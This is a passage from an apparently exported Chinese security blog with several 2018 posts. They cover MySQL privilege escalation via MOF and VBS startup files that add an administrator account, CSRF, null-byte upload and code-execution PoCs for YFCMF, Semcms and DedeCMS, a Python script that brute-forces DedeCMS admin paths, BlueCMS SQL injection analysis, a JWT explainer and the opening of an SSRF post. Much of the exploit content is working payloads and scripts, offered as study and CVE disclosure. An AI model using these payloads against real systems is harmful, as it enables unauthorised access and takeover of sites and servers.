&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。 验证提权当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。 可以看到，我们在test的普通用户下直接添加了hpdoger用户。剩下的操作就是用户命令处，换成加入administrator语句即可： net.exe user localgroup administrator hpdoger /add\\关于Mof提权的弊端我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？ cmd 下运行下面语句: net stop winmgmt del c:/windows/system32/wbem/repository net start winmgmt重启服务即可。 启动项提权在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和mof几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。 提权条件file_priv 不为null已知root密码 poccreate table a (cmd text); insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); select * from a into outfile &quot;C:\\\\Documents and Settings\\\\All Users\\\\「开始」菜单\\\\程序\\\\启动\\\\a.vbs&quot;;总结还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的"},{"title":"Phpstorm + phpstudy + Xdebug代码审计环境","date":"2018-08-24T16:00:00.000Z","path":"2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/","text":"写在前面硬着头皮挖了一些，也算是完成了之前一个月内出cve的任务：1、YFCMF:https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-164312、SQL in Bluecms1.6:https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-164323、XSS in Semcms:https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-164334、SQL in Semcms:https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434 但想学好代码审计还有很长的路要走，勿忘初心，开始正题~ 搭建环境安装php_xdebug.dllphpstudy自带各版本的xdebug.dll插件 在相应目录，如5.6.27版本下的在：phpStudy\\PHPTutorial\\php\\php-5.6.27-nts\\ext\\php_xdebug.dll 配置php.iniphp.ini在相应目录，如5.6.27版本下的在：\\phpStudy\\PHPTutorial\\php\\php-5.6.27-nts\\php.ini 在Xdebug部分加如下内容： [XDebug] zend_extension=&quot;D:\\phpStudy\\PHPTutorial\\php\\php-5.6.27-nts\\ext\\php_xdebug.dll&quot; xdebug.profiler_append = 0 xdebug.profiler_enable = 1 xdebug.profiler_enable_trigger = 0 xdebug.profiler_output_dir=&quot;D:\\phpStudy\\PHPTutorial\\tmp\\xdebug&quot; xdebug.trace_output_dir=&quot;D:\\phpStudy\\PHPTutorial\\tmp\\xdebug&quot; xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot; xdebug.remote_enable = 1 xdebug.remote_handler = &quot;dbgp&quot; xdebug.remote_host = &quot;127.0.0.1&quot; xdebug.remote_port = 9000 xdebug.idekey = PHPSTORMzend_extension：插件地址xdebug.remote_port = 9000 : Xdebug监听地址xdebug.idekey = PHPSTORM： idekey名称（与后面设置对应） 设置php解释器![](Delete Linkhttps://i.loli.net/2018/08/25/5b8157cb1f00f.png) 这里我用的是5.6.27版本的 设置xdebug参数Debug里设置监听地址： 接着设置代理： 配置Debug运行–&gt;编辑配置 Defaults–&gt;Web Page 新增一个服务端，填写信息如图，要点击应用和确认 回到上级页面后别忘了选择刚才添加的server 浏览器安装debug插件下面我是使用火狐的插件xdebug-ext进行调试，因为审计用得比较多的就是火狐了插件多 IDE key也要对应上我们的配置： 调试测试新建一个工程浏览器开启debug在需要debug的页面点击右上图标为红色时： 设置断点phpstorm开启debug点击右上角的小电话开启，再点左边的绿色甲壳虫图标进行调试 传参后看结果"},{"title":"Csrf in YFCMF 3.0","date":"2018-08-23T08:05:38.000Z","path":"2018/08/23/Csrf in YFCMF 3.0/","text":"ExplainThe background administrator adds CSRF to the page, causing other administrator accounts to add. Poc&lt;html&gt; &lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt; &lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt; &lt;option value=&quot;2&quot;/&gt; &lt;/select&gt; &lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt; &lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt; &lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt; &lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/html&gt;Reappearance1、View original users 2、Accessing structured CSRF pages 3、Successfully added"},{"title":"Arbitrary File upload in Semcms V2.7","date":"2018-08-23T02:00:18.000Z","path":"2018/08/23/Arbitrary File upload in Semcms V2.7/","text":"Explainphp Background pages restrict the type of uploaded files, jpe, gif, rar,we can break through the restrictions on uploading malicious files such as: PHP. CodeThe affected code(located:/ciuy_Admin/SEMCMS_Upfile.php): $newname=test_input($_POST[&quot;wname&quot;]).&quot;.&quot;.end($uptype)We could control the “wname” as we want,and uptype is the suffix which intercepted in allow FounctionThe attaking founction:use char(0) to cut off the filename and make up a renew suffix The affected page located in admin’s management page:ciuy_Admin/SEMCMS_Upfile.php ReappearanceFirst,we define our evil php’s suffix as test.rar(which is allowed) and post it as follow.There,we could see no files in the Folder Second,we change the php as php0x00 and the effection as : final effection and poc: Then, we could see the test.php in the folder: Finally, we could use tools (Cknife) to link the evil php summaryThis is a background getshell process. The required PHP version is less than 5.3"},{"title":"Dedecms V5.7 SP2代码审计","date":"2018-08-20T16:00:00.000Z","path":"2018/08/21/Dedecms V5.7 SP2代码审计/","text":"声明首发于安全客：代码审计入门级DedecmsV5.7 SP2分析复现 索引Dedecms的洞有很多，而最新版的v5.7 sp2更新止步于1月。作为一个审计小白,看过《代码审计-企业级Web代码安全构架》后，偶然网上冲浪看到mochazz师傅在blog发的审计项目,十分有感触。跟着复现了两个dedecms代码执行的cve,以一个新手的视角重新审视这些代码，希望文章可以帮助像我这样入门审计不久的表哥们。文章若有片面或不足的地方还请师傅们多多斧正 环境：php5.45 + mysql审计对象：DedeCMS V5.7 SP2工具：seay源码审计 后台代码执行漏洞描述DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell 代码审计漏洞位置：dede/tpl.php 看一下核心代码： # /dede/tpl.php &lt;?php require_once(dirname(__FILE__).&quot;/config.php&quot;); CheckPurview(&#39;plus_文件管理器&#39;); $action = isset($action) ? trim($action) : &#39;&#39;; ...... if(empty($filename)) $filename = &#39;&#39;; $filename = preg_replace(&quot;#[\\/\\\\\\\\]#&quot;, &#39;&#39;, $filename); ...... else if($action==&#39;savetagfile&#39;) { csrf_check(); if(!preg_match(&quot;#^[a-z0-9_-]{1,}\\.lib\\.php$#i&quot;, $filename)) { ShowMsg(&#39;文件名不合法，不允许进行操作！&#39;, &#39;-1&#39;); exit(); } require_once(DEDEINC.&#39;/oxwindow.class.php&#39;); $tagname = preg_replace(&quot;#\\.lib\\.php$#i&quot;, &quot;&quot;, $filename); $content = stripslashes($content); $truefile = DEDEINC.&#39;/taglib/&#39;.$filename; $fp = fopen($truefile, &#39;w&#39;); fwrite($fp, $content); fclose($fp); ...... }因为dedecms全局变量注册(register_globals=on)，这里有两个可控变量$filename&amp;$content action=savetag时，进行csrf()检测 function csrf_check() { global $token; if(!isset($token) || strcasecmp($token, $_SESSION[&#39;token&#39;]) != 0){ echo &#39;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#39;; exit; } }验证token和已知的session是否相等，那么token的值从何获取呢？ 回溯tpl.php，追踪一下token： else if ($action == &#39;upload&#39;) { .... &lt;input name=&#39;acdir&#39; type=&#39;hidden&#39; value=&#39;$acdir&#39; /&gt; &lt;input name=&#39;token&#39; type=&#39;hidden&#39; value=&#39;{$_SESSION[&#39;token&#39;]}&#39; /&gt; &lt;input name=&#39;upfile&#39; type=&#39;file&#39; id=&#39;upfile&#39; style=&#39;width:380px&#39; /&gt; }当action=upload时，隐藏表单的value提交token值 token搞定了，再让我们继续往下审~ $truefile = DEDEINC.&#39;/taglib/&#39;.$filename;传入的filename必须为 xxxx.lib.php，并且保存的也是php文件 fwrite($fp, $content); fclose($fp);写入内容为$content…那岂不是为所欲为..poc: http://localhost/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;filename=hpdoger.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=55f2eb0ad241e1893276ed1f8e7dd5fa在include/taglib下会产生相应xxx.lib.php 后台代码执行Getshell代码审计问题代码位于：/uploads/plus/ad_js.php */ require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;); if(isset($arcID)) $aid = $arcID; $arcID = $aid = (isset($aid) &amp;&amp; is_numeric($aid)) ? $aid : 0; if($aid==0) die(&#39; Request Error! &#39;); $cacheFile = DEDEDATA.&#39;/cache/myad-&#39;.$aid.&#39;.htm&#39;; if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time ) { $row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;); $adbody = &#39;&#39;; if($row[&#39;timeset&#39;]==0) { $adbody = $row[&#39;normbody&#39;]; } else { $ntime = time(); if($ntime &gt; $row[&#39;endtime&#39;] || $ntime &lt; $row[&#39;starttime&#39;]) { $adbody = $row[&#39;expbody&#39;]; } else { $adbody = $row[&#39;normbody&#39;]; } } $adbody = str_replace(&#39;&quot;&#39;, &#39;\\&quot;&#39;,$adbody); $adbody = str_replace(&quot;\\r&quot;, &quot;\\\\r&quot;,$adbody); $adbody = str_replace(&quot;\\n&quot;, &quot;\\\\n&quot;,$adbody); $adbody = &quot;&lt;!--\\r\\ndocument.write(\\&quot;{$adbody}\\&quot;);\\r\\n--&gt;\\r\\n&quot;; $fp = fopen($cacheFile, &#39;w&#39;); fwrite($fp, $adbody); fclose($fp); } include $cacheFile;摘出关键语句： if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )要求$nocache存在，又可以利用前面的全局变量注册 往下走Getone()函数进行sql查询，返回一个结果集。 而后把取到的值和当前的时间点对比作为判断条件，决定取表中的normbody还是exbody赋值给$adbody。 接着就比较明朗了..将$adbody写入文件，而文件名我们抓包应该就可以知道。 但是这里我只看了这一个文件，现在整理一下思路：1、给出一个$aid进行sql查询2、根据查询值判断\\写文件，且文件内容可控，目录已知3、最后把写入的文件包含进来。 那么，我们这个$aid从何处传入数据库呢？随着这个思路追踪文件到：/dede/ad_add.php 一个编辑页面，抓包看一下键值对应，顺便瞅一眼mysql载入的数据看到这里知道，清楚exbody和normbody对应的都是什么了 依据代码$row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);查看dede__myad这个库插入的内容： 看到timeset=0，那么直接是取$adbody = $row[&#39;normbody&#39;];其实timeset何时都为0，浏览ad_add.php代码部分看到，存入数据库的timeset值就为0 ok 现在思路明确,开始复现 复现我们已经保存过一个页面了，直接poke一下http://localhost/dedecms/uploads/plus/ad_js.php?aid=1看看 查看写入文件：http://localhost/dedecms/uploads/data/cache/myad-1.htm htm文件成功写入，我们回到Ad_js来执行一下任意代码。不要忘记闭合前面的document文档注释语句payload: hpdoger=echo &#39;--&gt;&#39;; phpinfo(); winapi查找后台目录利用条件1、win系统下搭建的网站2、网站后台目录存在/images/adminico.gif 基础知识windows环境下查找文件基于Windows FindFirstFile的winapi函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。 利用方法很简单，我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。 审计核心文件：common.inc.php if($_FILES) { require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;); }追踪uploadsafe.inc.php if( preg_match(&#39;#^(cfg_|GLOBALS)#&#39;, $_key) ) { exit(&#39;Request var not allow for uploadsafe!&#39;); } $$_key = $_FILES[$_key][&#39;tmp_name&#39;]; //获取temp_name ${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;]; ${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]); ${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]); if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\\.#&quot;, ${$_key.&#39;_name&#39;})) ) { if(!defined(&#39;DEDEADMIN&#39;)) { exit(&#39;Not Admin Upload filetype not allow !&#39;); } } if(empty(${$_key.&#39;_size&#39;})) { ${$_key.&#39;_size&#39;} = @filesize($$_key); } $imtypes = array ( &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot; ); if(in_array(strtolower(trim(${$_key.&#39;_type&#39;})), $imtypes)) { $image_dd = @getimagesize($$_key); //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。 if (!is_array($image_dd)) { exit(&#39;Upload filetype not allow !&#39;); } }摘出这句： $image_dd = @getimagesize($$_key); 进行判断$$_key是否为图片或图片是否存在 然而$$_key的来源是$_FILES[$_key][‘tmp_name’]，上文说了全局变量注册，$FILE可控，那我们传入一个$_FILES[$_key][‘tmp_name’]亦可控，此处是产生了一个变量覆盖的 接着再看同文件的代码 ${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;]; ${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]); ${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]); if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\\.#&quot;, ${$_key.&#39;_name&#39;})) ) { if(!defined(&#39;DEDEADMIN&#39;)) { exit(&#39;Not Admin Upload filetype not allow !&#39;); } }其中,$cfg_not_allowall的范围如下： $cfg_not_allowall = &quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;;既然上传的name不让以这些结尾，那么我们查.gif不过分吧 找一处验证以下这个核心文件产生的小漏洞： POC_FILES[hpdoger][tmp_name]=./ded&lt;&lt;/images/adminico.gif&amp;_FILES[hpdoger][name]=0&amp;_FILES[hpdoger][size]=0&amp;_FILES[hpdoger][type]=image/gif这个poc根据mochazz师傅的poc练手写的，膜mochazz师傅~： # -*- coding: utf-8 -*- from itertools import permutations import requests def guess_back_dir(url,data,characters): for num in range(1,5): for every in permutations(characters,num): payload = &#39;&#39;.join(every) data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p = payload) print(&quot;testing:&quot;,payload) r = requests.post(url,data = data) if find_page(r) &gt; 0: print(&quot;back_dir:[+]&quot;,payload) data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot; return payload data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot; def guess_rest_dir(back_dir,url,data,characters): while True: for singel in characters: if singel != characters[-1]: data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p=back_dir + singel) r = requests.post(url,data = data) # print data if find_page(r) &gt; 0: print(&quot;guess successfully[+]:&quot;,back_dir) back_dir += singel data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot; break data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot; else: return back_dir def find_page(response): if &quot;Upload filetype not allow !&quot; not in response.text and response.status_code == 200: return 1 def main(): characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot; url = raw_input(&quot;Please input your target:&quot;) data = { &quot;_FILES[hpdoger][tmp_name]&quot;: &quot;./{p}&lt;&lt;/images/adminico.gif&quot;, &quot;_FILES[hpdoger][name]&quot;: 0, &quot;_FILES[hpdoger][size]&quot;: 0, &quot;_FILES[hpdoger][type]&quot;: &quot;image/gif&quot; } back_dir = guess_back_dir(url,data,characters) name = guess_rest_dir(back_dir,url,data,characters) print(&quot;The background address is[+]:&quot;,name) if __name__ == &#39;__main__&#39;: main()最后穿插一个关于FILE变量的小知识点$_FILES[“file”][“name”] - 被上传文件的名称$_FILES[“file”][“type”] - 被上传文件的类型$_FILES[“file”][“size”] - 被上传文件的大小，以字节计$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称$_FILES[“file”][“error”] - 由文件上传导致的错误代码 相关链接代码审计之DedeCMS V5.7 SP2后台存在代码执行漏洞(https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/) 奇技淫巧 | DEDECMS找后台目录(https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/) 膜前辈师傅们~"},{"title":"代码审计复现：Bluecms 1.6","date":"2018-08-18T03:14:10.000Z","path":"2018/08/18/代码审计复现：Bluecms 1.6/","text":"写在前面最近一阵子得了一场病，加之情感上的一件事，痛不欲生。陆陆续续的缓过来了，渡劫余生，留下该留下的。病也慢慢在恢复了。 前些日子说要学代码审计，买了本《代码审计》看了两天，为作者尹毅先生无限打call，人生导师一样的人物，经历是传奇的，努力是可见的。书中开篇点题为什么要代码审计？这是web狗的一项技能。其实，当初学安全的时候我一直想要走的方向是渗透，虽然至今也是。但是渗透就仅仅是用工具来attack么？不，渗透是一种思路，是一种积累，也是一种艺术。它是我们基础的升华，经验的绽放。脚本小子use tools will nerver be a hacker。我们要学的、做的要很多，知识面要很宽，尽管路会很难。 从今天起，至未来的一个月，会把学习的全部精力都投入到审计方向，立下flag:未来半个月内拿自己的cve 环境cms: bulecms 1.6 sp1php: 5.4 + mysql 5.5.53 sql注入一代码审计问题文件位于：/uploads/ad_js.php $ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id =&quot;.$ad_id);变量未用单引号闭合，可能会引起注入 跟踪一下$ad_id，查找该参数如何获得 $ad_id = !empty($_GET[&#39;ad_id&#39;]) ? trim($_GET[&#39;ad_id&#39;]) : &#39;&#39;;trim去掉ad_id两侧空格，未过滤参数，可注入 再追踪一下getone()函数怎么定义的，一个定义mysql相关操作的文件位于/uploads/include/mysql.class.php： function getone($sql, $type=MYSQL_ASSOC){ $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row; }追踪此类里query函数的定义： function query($sql){ if(!$query=@mysql_query($sql, $this-&gt;linkid)){ $this-&gt;dbshow(&quot;Query error:$sql&quot;); }else{ return $query; } }查询出错则dbshow进行报错，有结果则返回$query集合后，$row进行取值 复现 sql注入二一开始审了一个前台/uploads/user.php的宽字节注入,记一下思路： 在mysql.class.php中看到： mysql_query( &quot;SET NAMES gbk&quot;);看一下有没有进行addslashes过滤 果然对POST\\GET过滤，追踪deep_addslashes function deep_addslashes($str) { if(is_array($str)) { foreach($str as $key=&gt;$val) { $str[$key] = deep_addslashes($val); } } else { $str = addslashes($str); } return $str; }联想宽字节，先追踪一下处理表单的方法 elseif($act == &#39;index_login&#39;){ $user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;; $pwd = !empty($_REQUEST[&#39;pwd&#39;]) ? trim($_REQUEST[&#39;pwd&#39;]) : &#39;&#39;; $remember = isset($_REQUEST[&#39;remember&#39;]) ? intval($_REQUEST[&#39;remember&#39;]) : 0; if($user_name == &#39;&#39;){ showmsg(&#39;�û�������Ϊ��&#39;); } if($pwd == &#39;&#39;){ showmsg(&#39;���벻��Ϊ��&#39;); } $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;); if($row[&#39;num&#39;] == 1){ showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;); } $w = login($user_name, $pwd); if(defined(&#39;UC_API&#39;) &amp;&amp; @include_once(BLUE_ROOT.&#39;uc_client/client.php&#39;)){ list($uid, $username, $password, $email) = uc_user_login($user_name, $pwd); if($uid&gt;0){ $password = md5($password); if(!$w){ $db-&gt;query(&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_name, pwd, email, reg_time) VALUES (&#39;$username&#39;, &#39;$password&#39;, &#39;$email&#39;, &#39;$timestamp&#39;)&quot;); $w = 1; } $ucsynlogin = uc_user_synlogin($uid); } elseif($uid === -1){ if($w == 1){ $user_info = $db-&gt;getone(&quot;SELECT email FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;); $uid = uc_user_register($user_name, $pwd, $user_info[&#39;email&#39;]); if($uid &gt; 0) $ucsynlogin = uc_user_synlogin($uid); }else $w = -1; } elseif($uid == -2){ showmsg(&#39;�������&#39;); } echo $ucsynlogin; } if($w == -1 || $w == 0){ showmsg(&#39;��������û��������벻��ȷ&#39;); } elseif($w == 1){ update_user_info($user_name); if($remember==1){ setcookie(&#39;BLUE[user_id]&#39;, $_SESSION[&#39;user_id&#39;], time()+172800, $cookiepath, $cookiedomain); setcookie(&#39;BLUE[user_name]&#39;, $user_name, time()+172800, $cookiepath, $cookiedomain); setcookie(&#39;BLUE[user_pwd]&#39;, md5(md5($pwd).$_CFG[&#39;cookie_hash&#39;]), time()+172800, $cookiepath, $cookiedomain); } showmsg(&#39;��ӭ�� &#39;.$user_name.&#39; ���������ڽ�ת����Ա����&#39;, &#39;user.php&#39;); } }追踪user_name怎么传入： $user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;发现无过滤 再追踪一下对suername的sql语句如何执行： $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);看到调用了getone()函数，第一个注入有介绍。 再看到下面一句： if($row[&#39;num&#39;] == 1){ showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;); }在admin的表中查询admin_name表中是否有传入的user_name，若存在，$row[‘num’]值为1，然后执行showmsg函数，输出：“前台无法登陆”后返回主页。值为0进行以下操作： $w = login($user_name, $pwd);再追踪login函数得到： function login($user_name,$pwd){ global $db; $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;); if($row[&#39;num&#39;]==0){ $result = 0; }else{ $sql = &quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39; and pwd=md5(&#39;$pwd&#39;)&quot;; $user_num = $db-&gt;getone($sql); if($user_num[&#39;num&#39;]){ $result = 1; }else $result = -1; } return $result; }到这里我们可以理解，这个页面的登陆逻辑是这样的： 如果我们的用户名是admin表中用户名，则不允许登陆若不是表中的用户名，则会进行user表的对比查询，再判断是否有这个用户 明确思路：盲注注入是否成功的判断条件：$row[‘num’]返回值 复现success injection: default injection: google一下发现别人挖过后台登陆验证的宽字节，能够利用… 相关链接p师傅的浅析白盒审计中的字符编码及SQL注入：http://www.freebuf.com/articles/web/31537.html"},{"title":"(转载)基于 Token 的身份验证","date":"2018-08-11T16:00:00.000Z","path":"2018/08/12/（转载） 基于 Token 的身份验证/","text":"传统身份验证的方法HTTP 是一种没有状态的协议，也就是它并不知道是谁是访问应用。这里我们把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下。 解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的 ID 号发送给客户端，客户端收到以后把这个 ID 号存储在 Cookie 里，下次这个用户再向服务端发送请求的时候，可以带着这个 Cookie ，这样服务端会验证一个这个 Cookie 里的信息，看看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。 上面说的就是 Session，我们需要在服务端存储为登录的用户生成的 Session ，这些 Session 可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的 Session 。 基于 Token 的身份验证方法使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的： 客户端使用用户名跟密码请求登录 服务端收到请求，去验证用户名与密码 验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端 客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里 客户端每次向服务端请求资源的时候需要带着服务端签发的 Token 服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据 JWT实施 Token 验证的方法挺多的，还有一些标准方法，比如 JWT，读作：jot ，表示：JSON Web Tokens 。JWT 标准的 Token 有三个部分： header payload signature 中间用点分隔开，并且都会使用 Base64 编码，所以真正的 Token 看起来像这样： eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc Headerheader 部分主要是两部分内容，一个是 Token 的类型，另一个是使用的算法，比如下面类型就是 JWT，使用的算法是 HS256。 { “typ”: “JWT”, “alg”: “HS256” } 上面的内容要用 Base64 的形式编码一下，所以就变成这样： eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 PayloadPayload 里面是 Token 的具体内容，这些内容里面有一些是标准字段，你也可以添加其它需要的内容。下面是标准字段： iss：Issuer，发行者 sub：Subject，主题 aud：Audience，观众 exp：Expiration time，过期时间 nbf：Not before iat：Issued at，发行时间 jti：JWT ID 比如下面这个 Payload ，用到了 iss 发行人，还有 exp 过期时间。另外还有两个自定义的字段，一个是 name ，还有一个是 admin 。 { “iss”: “ninghao.net”, “exp”: “1438955445”, “name”: “wanghao”, “admin”: true } 使用 Base64 编码以后就变成了这个样子： eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ SignatureJWT 的最后一部分是 Signature ，这部分内容有三个部分，先是用 Base64 编码的 header.payload ，再用加密算法加密一下，加密的时候要放进去一个 Secret ，这个相当于是一个密码，这个密码秘密地存储在服务端。 header payload secret var encodedString = base64UrlEncode(header) + “.” + base64UrlEncode(payload); HMACSHA256(encodedString, ‘secret’); 处理完成以后看起来像这样： SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc 最后这个在服务端生成并且要发送给客户端的 Token 看起来像这样： eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc 客户端收到这个 Token 以后把它存储下来，下回向服务端发送请求的时候就带着这个 Token 。服务端收到这个 Token ，然后进行验证，通过以后就会返回给客户端想要的资源。 转载本文转载自https://ninghao.net/blog/2834"},{"title":"初探ssrf","date":"2018-08-09T16:00:00.000Z","path":"2018/08/10/初探ssrf/","text":"索引ssrf是很常见的一个漏洞，一开始把ssrf简单的理解为链接重定向漏洞，其实也可以这么说，曾经这个漏洞影响过许多互联网企业。 危害有如下几个类型: 